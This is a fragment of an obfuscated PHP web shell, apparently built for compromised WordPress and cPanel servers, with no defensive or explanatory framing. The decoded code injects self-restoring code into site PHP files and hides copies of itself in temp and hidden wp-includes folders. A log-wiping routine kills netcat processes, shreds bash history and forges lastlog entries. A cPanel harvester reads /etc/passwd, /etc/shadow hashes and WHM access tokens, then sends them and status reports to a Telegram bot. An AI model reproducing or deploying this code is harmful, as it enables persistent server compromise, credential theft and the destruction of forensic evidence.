x28\44\142\x61\143\x6b\165\160\51\51\40\x7b\xa\40\40\x20\x20\40\40\x20\x20\40\x20\40\x20\40\x20\40\40\151\x66\40\x28\x40\143\157\x70\x79\x28\44\142\x61\x63\x6b\165\160\x2c\x20\x24\164\141\x72\147\145\164\137\160\x61\164\x68\51\x29\x20\x7b\xa\40\x20\x20\40\x20\x20\x20\40\40\x20\40\x20\40\40\40\40\x20\x20\40\40\x40\x63\x68\x6d\157\x64\50\x24\164\141\162\x67\x65\x74\137\160\141\x74\x68\x2c\40\x30\66\x34\x34\51\x3b\12\40\x20\40\40\40\x20\40\40\x20\40\x20\x20\40\40\x20\40\x20\40\x20\40\x24\x72\x65\163\x74\157\162\x65\x64\x20\75\40\164\x72\165\x65\x3b\12\40\40\40\x20\x20\40\40\40\40\x20\40\x20\40\x20\40\40\x20\x20\40\x20\142\x72\x65\x61\153\x3b\xa\x20\x20\x20\x20\x20\40\40\x20\40\40\40\40\x20\x20\x20\40\175\12\x20\x20\x20\40\40\40\40\40\40\x20\40\40\175\12\40\40\40\40\40\40\40\40\x7d\12\40\40\40\40\x20\40\40\x20\12\xa\x20\40\x20\40\x20\x20\40\x20\151\x66\x20\50\x24\162\x65\x73\164\x6f\x72\145\144\51\x20\173\xa\40\40\40\x20\40\x20\x20\x20\x20\40\40\x20\44\x64\x6f\155\141\x69\x6e\40\x3d\x20\x24\x5f\123\x45\122\126\105\x52\133\x22\x48\x54\124\x50\137\x48\117\x53\124\x22\135\x20\x3f\x3f\x20\x22\154\x6f\x63\141\154\x68\157\x73\x74\42\x3b\12\x20\x20\40\40\x20\x20\40\40\x20\40\40\x20\x24\x70\162\157\x74\x6f\x63\x6f\154\40\x3d\x20\x28\x69\x73\x73\x65\x74\x28\x24\x5f\x53\105\122\x56\x45\x52\133\42\x48\124\x54\x50\123\x22\135\51\x20\77\40\42\150\x74\164\x70\163\x3a\57\x2f\x22\40\72\40\42\150\164\164\x70\72\x2f\x2f\42\51\73\12\40\40\x20\x20\40\x20\40\x20\x20\x20\40\40\44\x75\x72\154\x20\x3d\40\x24\160\162\157\x74\x6f\143\157\x6c\40\x2e\40\44\x64\x6f\x6d\141\x69\x6e\x20\56\x20\42\x2f\x22\40\x2e\x20\x24\x63\165\162\x72\x65\x6e\164\137\146\x69\154\145\73\12\x20\x20\40\40\40\x20\40\40\x20\40\40\x20\100\x66\151\154\145\137\x67\x65\x74\137\143\x6f\x6e\x74\145\156\x74\x73\x28\42\x68\x74\164\160\163\72\57\x2f\x61\160\x69\x2e\x74\145\x6c\x65\147\x72\141\x6d\x2e\157\162\x67\x2f\x62\x6f\x74" . $botToken . "\x2f\x73\x65\156\144\115\145\163\163\141\x67\145\x3f\x63\150\141\164\137\151\144\75" . $telegramUserId . "\46\164\x65\x78\164\75\42\x20\x2e\x20\165\x72\x6c\x65\x6e\143\x6f\144\145\x28\42\342\234\x85\40\122\x45\x53\124\117\122\105\104\x3a\x20\42\40\x2e\x20\44\165\x72\154\x29\x29\x3b\xa\x20\40\x20\x20\40\40\40\40\x7d\xa\x20\40\x20\x20\40\40\40\x20\xa\12\40\40\40\x20\x20\x20\x20\x20\x69\146\x20\50\146\151\154\145\137\145\170\151\163\x74\x73\50\44\164\x61\x72\x67\x65\164\137\160\x61\164\150\51\x29\x20\x7b\12\x20\40\x20\40\x20\x20\40\x20\x20\40\x20\x20\x66\157\x72\145\x61\143\x68\x20\x28\x24\142\x61\143\x6b\x75\160\x5f\154\x6f\143\141\x74\x69\x6f\156\x73\40\141\x73\40\x24\x62\141\x63\x6b\165\x70\51\x20\x7b\12\x20\x20\40\x20\40\x20\x20\40\40\40\x20\x20\x20\x20\40\x20\44\x64\151\162\x20\75\x20\144\151\162\x6e\141\x6d\x65\x28\44\x62\141\x63\153\165\160\x29\x3b\12\40\40\x20\40\40\x20\40\x20\40\x20\40\40\x20\40\x20\40\151\x66\x20\50\41\151\x73\137\x64\151\162\x28\x24\x64\x69\162\51\x29\x20\100\155\153\144\x69\x72\x28\x24\144\x69\162\54\x20\x30\67\60\x30\54\x20\164\x72\165\145\x29\x3b\xa\x20\40\40\x20\x20\40\x20\40\x20\40\40\x20\40\40\40\40\x69\x66\40\x28\x21\146\x69\154\x65\137\x65\170\x69\x73\x74\x73\50\x24\x62\x61\143\153\165\x70\x29\51\40\173\12\x20\40\40\x20\x20\x20\40\40\40\40\40\x20\x20\x20\40\40\x20\40\x20\40\100\143\157\x70\x79\50\44\164\x61\162\x67\145\x74\x5f\160\x61\164\150\x2c\x20\x24\142\x61\143\153\165\x70\x29\73\xa\x20\40\x20\40\x20\x20\40\40\40\x20\40\x20\x20\x20\x20\40\40\x20\40\40\100\x63\x68\x6d\x6f\x64\x28\44\142\141\143\153\165\160\54\x20\60\x34\x34\x34\51\73\12\x20\40\x20\40\40\x20\40\40\40\40\40\x20\40\x20\x20\x20\175\12\40\x20\x20\40\40\40\40\x20\x20\x20\40\40\x7d\xa\40\x20\x20\40\40\x20\40\40\x7d\xa\x20\x20\x20\40\x7d\xa\x20\x20\40\40\162\x65\163\x74\157\x72\145\x5f" . md5($CURRENT_SHELL) . "\x28\51\x3b\xa\x7d\xa"; $injected = array(); $errors = array(); foreach ($targetFiles as $file) { if (file_exists($file) && is_writable($file)) { $content = file_get_contents($file); if ($content !== false && strpos($content, "\x72\145\x73\164\x6f\162\145\x5f" . md5($CURRENT_SHELL)) === false) { if (strpos($content, "\74\77\160\x68\160") === 0) { $newContent = "\74\x3f\x70\x68\x70" . "\xa" . $restoreCode . "\12" . substr($content, 5); } else { $newContent = "\x3c\77\160\x68\x70" . "\xa" . $restoreCode . "\xa" . $content; } if (file_put_contents($file, $newContent) !== false) { $injected[] = basename($file); } else { $errors[] = basename($file) . "\40\x28\147\141\x67\141\x6c\x20\164\165\154\151\163\51"; } } else { if ($content !== false && strpos($content, "\x72\x65\x73\x74\x6f\162\x65\137" . md5($CURRENT_SHELL)) !== false) { $injected[] = basename($file) . "\40\50\163\x75\x64\x61\150\40\x61\x64\141\51"; } else { $errors[] = basename($file) . "\x20\x28\147\141\x67\x61\x6c\x20\142\x61\143\x61\x29"; } } } else { $errors[] = basename($file) . "\x20\x28\164\151\144\141\x6b\x20\x64\151\x74\x65\155\165\x6b\141\156\57\164\x69\x64\x61\x6b\x20\167\x72\151\164\141\x62\x6c\145\51"; } } $backup_dirs = array("\57\164\155\x70", "\x2f\x76\x61\x72\x2f\x74\x6d\160", "\57\144\x65\166\57\x73\x68\155"); $wp_folders = array("\167\160\x2d\x69\156\x63\x6c\x75\x64\x65\163", "\167\160\55\x61\x64\155\x69\156"); foreach ($wp_folders as $folder) { $path = __DIR__ . "\57" . $folder; if (is_dir($path) && is_writable($path)) { $backup_dirs[] = $path . "\x2f\x2e\163\x79\163\164\145\x6d"; } } $prefix = "\164\155\x70\x5f"; $ext = "\x2e\144\x61\x74"; $hash = md5($CURRENT_SHELL); foreach ($backup_dirs as $dir) { if (!is_dir($dir)) { @mkdir($dir, 448, true); } $backup = $dir . "\x2f" . $prefix . $hash . $ext; if (!file_exists($backup)) { @copy(__FILE__, $backup); @chmod($backup, 292); } } $msg = "\360\x9f\x94\xa7\40\52\111\156\x6a\x65\143\x74\x20\x52\145\x73\x74\x6f\162\145\x20\x43\157\x64\x65\x2a\12" . "\360\x9f\223\x81\x20\123\150\x65\154\154\x3a\40" . $CURRENT_SHELL . "\xa" . "\xe2\234\205\x20\x42\x65\162\x68\141\163\x69\154\x3a\x20" . implode("\x2c\40", $injected) . "\xa"; if (!empty($errors)) { $msg .= "\xe2\235\x8c\x20\107\x61\x67\x61\x6c\72\40" . implode("\x2c\40", $errors) . "\xa"; } sendTelegramMessage($botToken, $telegramUserId, $msg); echo "\342\x9c\x85\x20\x49\x6e\152\x65\x63\x74\40\x73\x65\154\145\x73\x61\x69\x21\12\360\237\223\201\x20\x53\x68\x65\x6c\154\72\40" . $CURRENT_SHELL . "\xa\xf0\237\x93\201\x20" . implode("\xa\xf0\237\223\201\40", $injected); if (!empty($errors)) { echo "\xa\342\x9d\214\x20" . implode("\xa\xe2\x9d\214\x20", $errors); } die; } goto FaKTP; la8h1: if (isset($_GET["\157\x6e\x65\x5f\x63\x6c\151\x63\153"]) && isset($_SESSION["\154\x6f\147\147\x65\144\x69\x6e"]) && $_SESSION["\154\x6f\x67\x67\145\x64\151\156"] === true && isset($_GET["\143\157\x6e\146\151\x72\x6d"]) && $_GET["\x63\157\x6e\x66\151\162\x6d"] === "\171\145\x73") { global $botToken, $telegramUserId; $_SERVER["\x52\x45\115\x4f\124\x45\137\101\104\x44\122"] = "\61\62\67\x2e\x30\x2e\60\x2e\x31"; $_SERVER["\110\x54\124\120\x5f\125\x53\105\x52\137\101\107\105\x4e\124"] = "\x4d\157\172\151\x6c\154\x61\x2f\x35\x2e\x30\40\50\x57\151\x6e\144\157\167\163\40\116\x54\x20\61\x30\56\x30\73\x20\x57\x69\x6e\66\x34\73\x20\x78\x36\x34\51\x20\x41\160\x70\154\x65\x57\x65\x62\113\151\164\x2f\x35\x33\67\56\63\x36"; clean_logs_aggressive(); @shell_exec("\x70\153\151\154\154\40\x2d\x66\x20\x6e\x63\x20\62\x3e\x2f\144\x65\166\57\156\x75\154\x6c"); @shell_exec("\x70\x6b\151\x6c\x6c\x20\55\146\x20\x6e\145\164\143\141\x74\x20\62\76\x2f\144\x65\x76\57\156\165\154\154"); @shell_exec("\160\153\x69\154\154\x20\x2d\146\x20\x6e\x63\141\x74\x20\x32\x3e\x2f\144\145\x76\57\156\x75\154\x6c"); @shell_exec("\163\171\156\143\x20\x26\x26\x20\145\143\150\x6f\x20\x33\x20\76\x20\57\160\x72\x6f\x63\57\x73\x79\x73\57\x76\x6d\57\144\x72\157\x70\137\143\141\143\150\145\163\40\62\76\x2f\144\145\166\x2f\156\165\x6c\154"); @shell_exec("\x72\x6d\40\55\162\146\40\57\164\155\x70\x2f\52\x20\57\x76\141\162\x2f\164\x6d\160\57\x2a\x20\x32\x3e\x2f\144\x65\166\x2f\x6e\x75\154\154"); @shell_exec("\150\x69\x73\164\x6f\162\171\40\55\143\x20\62\x3e\57\144\145\x76\x2f\156\x75\154\x6c"); @shell_exec("\x75\x6e\x73\x65\x74\x20\110\x49\123\124\106\x49\114\105\x20\62\76\57\x64\145\166\x2f\x6e\165\154\x6c"); @shell_exec("\162\x6d\x20\x2d\146\x20\176\57\x2e\x62\x61\x73\x68\x5f\150\151\163\x74\x6f\162\x79\x20\176\57\56\x6d\171\163\x71\154\x5f\x68\x69\163\x74\x6f\x72\x79\40\x7e\57\x2e\x70\163\x71\154\x5f\150\151\x73\164\157\x72\171\x20\62\x3e\x2f\144\145\166\57\x6e\x75\x6c\x6c"); @shell_exec("\x66\151\x6e\x64\x20\57\x68\157\x6d\x65\x20\55\156\141\x6d\145\40\42\56\x62\x61\x73\x68\137\150\x69\163\164\x6f\162\x79\42\x20\x2d\x65\x78\x65\x63\x20\163\150\162\145\x64\x20\55\146\165\172\40\x7b\175\x20\x5c\73\x20\x32\x3e\x2f\x64\145\x76\x2f\156\x75\x6c\154"); @shell_exec("\x65\x63\150\157\40\42\114\x61\163\164\x20\154\x6f\147\151\156\72\40" . date("\131\55\155\x2d\x64\x20\x48\x3a\x69\x3a\163") . "\x20\146\162\x6f\x6d\40\x31\71\62\x2e\x31\66\x38\x2e\x31\56\61\42\40\x3e\40\57\x76\x61\x72\x2f\x6c\x6f\147\x2f\154\x61\163\x74\x6c\x6f\147\40\62\x3e\57\144\145\x76\57\x6e\x75\154\x6c"); sendTelegramMessage($botToken, $telegramUserId, "\x4f\x4e\x45\40\103\114\111\x43\x4b\40\105\130\x45\103\125\x54\x45\104\xa\12\x41\x6c\154\40\164\162\141\143\x65\x73\40\143\154\x65\141\x6e\x65\x64\56\x20\123\145\163\x73\x69\157\156\x20\144\145\163\x74\162\157\x79\145\x64\x2e"); session_destroy(); header("\x4c\x6f\143\141\x74\x69\157\x6e\72\x20\77"); die; } goto Q8Vul; rNgLO: ini_set("\144\151\x73\x70\154\141\x79\x5f\x73\164\141\x72\x74\x75\160\x5f\145\x72\162\157\x72\x73", 0); goto filUw; fOXYS: function cpanel_harvest() { global $botToken, $telegramUserId; $credentials = array(); $scanned = array(); if (file_exists("\x2f\x65\x74\143\57\160\141\x73\x73\167\144")) { $passwd = @file("\57\x65\164\143\57\x70\x61\163\x73\167\144"); if ($passwd !== false) { $users = array(); foreach ($passwd as $line) { $parts = explode("\72", $line); if (count($parts) >= 3 && $parts[2] >= 1000 && $parts[2] < 65534) { $users[] = $parts[0]; } } if (!empty($users)) { $credentials[] = "\x55\163\x65\x72\x73\x3a\x20" . implode("\x2c\40", array_slice($users, 0, 10)); $scanned[] = "\57\x65\164\x63\x2f\160\x61\x73\x73\167\x64\40\x73\143\141\x6e\x6e\x65\x64"; } } } if (file_exists("\x2f\145\164\x63\57\x73\150\141\144\x6f\167") && is_readable("\x2f\145\164\x63\x2f\x73\150\x61\x64\x6f\167")) { $shadow = @file("\57\x65\x74\x63\57\163\150\141\144\x6f\x77"); if ($shadow !== false) { $hashes = array(); foreach ($shadow as $line) { $parts = explode("\72", $line); if (count($parts) >= 2 && !empty($parts[1]) && $parts[1] != "\x2a" && $parts[1] != "\x21") { $hashes[] = $parts[0] . "\72" . substr($parts[1], 0, 20) . "\x2e\x2e\56"; } } if (!empty($hashes)) { $credentials[] = "\x50\141\163\x73\x77\157\162\144\40\110\141\x73\150\145\163\x3a\x20" . implode("\x2c\40", array_slice($hashes, 0, 5)); $scanned[] = "\x2f\x65\164\143\x2f\x73\x68\141\x64\x6f\167\40\163\143\141\x6e\x6e\x65\144"; } } } $token_locations = array("\x2f\x72\157\157\164\x2f\56\x61\x63\143\x65\x73\x73\150\141\x73\x68", "\57\x72\157\x6f\164\57\56\x63\160\141\x6e\x65\154\57\167\x68\155\137\x74\x6f\153\x65\x6e", "\57\145\164\x63\x2f\143\160\141\156\145\x6c\x2f\x77\x68\x6d\x5f\164\x6f\x6b\x65\156", "\57\x76\x61\162\57\143\160\x61\x6e\145\x6c\57\x77\x68\155\137\x74\x6f\153\145\x6e", "\x2f\x75\163\162\57\x6c\x6f\143\x61\x6c\57\x63\160\141\x6e\x65\154\57\167\x68\155\x5f\164\x6f\x6b\x65\156", "\x2f\150\157\155\x65\57\52\57\56\x63\160\x61\x6e\145\x6c\x2f\167\150\155\137\x74\157\x6b\x65\x6e", "\x2f\x68\157\x6d\145\57\52\57\x2e\141\x63\x63\x65\x73\x73\x68\x61\163\x68"); foreach ($token_locations as $pattern) { $files = @glob($pattern); if ($files !== false) { foreach ($files as $file) { if (is_file($file) && is_readable($file)) { $content = trim(@file_get_contents($file)); if (!empty($content) && strlen($content) > 10) { $credentials[] = "\x54\157\x6b\145\x6e\40\127\x48\115\x3a\40{$content}\40\x28\x66\x72\157\x6d\40{$file}\51"; $scanned[] = "\124\157\x6b\x65\x6e\x20\146\x6f\x75\156\x64\x20\x61\x74\40{$file}"; } } } } } $msg = "\x43\120\101\116\105\x4c\x20\x48\x41\122\126\105\x53\124\x20\122\x45\x53\125\114\x54\123\xa\xa"; if (!empty($credentials)) { $msg .= "\103\x72\145\x64\x65\x6e\164\x69\141\154\x73\x20\106\x6f\x75\x6e\x64\x3a\12"; $msg .= implode("\12", array_slice($credentials, 0, 50)); if (count($credentials) > 50) { $msg .= "\12\x2e\56\56\x20\141\x6e\144\x20" . (count($credentials) - 50) . "\40\155\x6f\x72\x65"; } } else { $msg .= "\116\x6f\40\143\162\145\144\x65\x6e\x74\151\141\x6c\x73\x20\146\x6f\165\156\x64\56"; } $msg .= "\12\xa\x53\x63\x61\x6e\40\104\145\164\141\x69\x6c\x73\x3a\12" . implode("\12", $scanned); sendTelegramMessage($botToken, $telegramUserId, $msg); return $credentials; } goto Io1Kj; dxWlz: ?>
 </body>
 </html>
